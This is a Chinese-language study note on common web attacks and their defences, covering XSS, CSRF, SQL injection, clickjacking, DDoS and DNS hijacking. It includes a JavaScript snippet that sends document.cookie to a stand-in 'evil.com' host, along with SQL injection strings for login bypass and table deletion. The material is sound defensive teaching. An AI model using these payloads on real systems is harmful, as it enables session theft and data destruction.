## XSS攻击

XSS（Cross Site Scripting）跨站脚本攻击：在网页中注入恶意脚本。用户浏览网页时执行恶意脚本。常见类型为反射型XSS和存储型XSS。

比如一个url

```
http://localhost/xss/test.php?usr=<script=http://www.evil.com/evil.js
```

```js
var img=document.createElement('img')
img.src='http://www.evil.com/log?'+encodeURIComponent(document.cookie)
document.body.appendChild(img)
```

##### 防护

1. HttpOnly 在**Set-Cookie**的时候标记的。 
2. 移除用户输入的和事件相关的属性。
   1.  如onerror可以自动触发攻击，还有onclick
   2. 移除用户输入的Style节点、Script节点、Iframe节点
3. 避免直接对HTML Entity进行解码。使用DOM Parse转换，校正不配对的DOM标签。 html encode进行转译

## Referrer

referrer泄漏   no-referrer-when-downgrade

##### 防护

Referrer-Policy 设置strict-origin-when-cross-origin

## CSRF

CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

#### 流程

- 用户登录了A站，保留登录凭证
- 攻击者引诱用户访问了B站
- B站向A站发送正常请求
- A站验证后以为是用户发出，执行相关操作
- 攻击完成

> cookie保证了用户可以处于登录状态，但网站B其实拿不到 cookie。

##### 防护

1. 添加验证码
2. Anti CSRF Token 请求参数里面的随机token

## 注入攻击

- SQL注入

```sql
SELCT * FROM user WHERE email='%s' AND password='%s'
```

1. 绕过秘密 email="xxx' OR 1=1 --" password="****"
2. 删除数据表 email="xxx';  drop table --" password="****"

##### 防护

1. 预编译语句 绑定变量
2. 特殊字符转译
3. 不返回详细sql信息
4. 严格控制数据库权限

- XML注入

## 点击劫持

视觉欺骗（透明的iframe）

##### 防护

X-FRAME-OPTIONS

## DDOS攻击

DDOS（Distributed Denial Of Service）分布式拒绝服务。利用合理的请求造成资源过载，导致服务不可用。

#### 特征

- 来自单个 IP 地址或 IP 范围的可疑流量
- 来自共享单个行为特征（例如设备类型、地理位置或 Web 浏览器版本）的用户的大量流量
- 对单个页面或端点的请求数量出现不明原因的激增
- 奇怪的流量模式，例如一天中非常规时间段的激增或看似不自然的模式（例如，每 10 分钟出现一次激增）

#### 类型

- 网络层

  - SYN

    依靠TCP三次握手机制，随意构造源ip发送SYN包，SYN+ACK包就得不到应答

  - ACK

    查表，响应ACK/RST

  - UDP

- 应用层

  - DNS

    依靠dns解析机制，随意构造域名，DNS服务器递归查询，造成很大负载

  - http慢连接

    建立http连接，设置一个较大的content-length，但是每次只发送很少字节，让服务器一直以为http头部没有传输完

##### 防护

- 打开SYN半数连接数目
- 严格限制向外访问
- 限制请求频率，重定向到错误页面
- 验证码

## 文件传输漏洞

##### 防护

- 使用白名单
- 使用随机数改写文件路径和文件名

## DNS劫持

通过某些手段获取某域名的解析控制权，修改域名的解析结果

##### 防护

- 使用114.114.114.114 或者8.8.8.8
- 使用多个域名
- 移动端httpDNS

